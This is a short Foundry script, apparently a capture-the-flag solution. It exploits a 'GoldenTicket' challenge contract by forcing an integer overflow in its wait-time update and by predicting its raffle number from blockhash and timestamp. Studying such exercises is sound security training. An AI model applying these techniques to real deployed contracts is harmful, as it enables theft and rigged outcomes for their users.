// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/GoldenTicket.sol";

contract GoldenTicketTest is Script {
    GoldenTicket public target;
    address instanceAddress = 0xe769049271a0cF20a07E65d655DA382fC4A78736;

    function setUp() public {
        target = GoldenTicket(payable(instanceAddress));
        vm.label(address(target), "Challenge");
    }

    function run() public {
        vm.startBroadcast();

        target.joinWaitlist();
        target.updateWaitTime(
            type(uint256).max - target.waitlist(msg.sender) + 1
        );

        target.joinRaffle(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        require(target.hasTicket(msg.sender), "Failed");

        vm.stopBroadcast();
    }
}
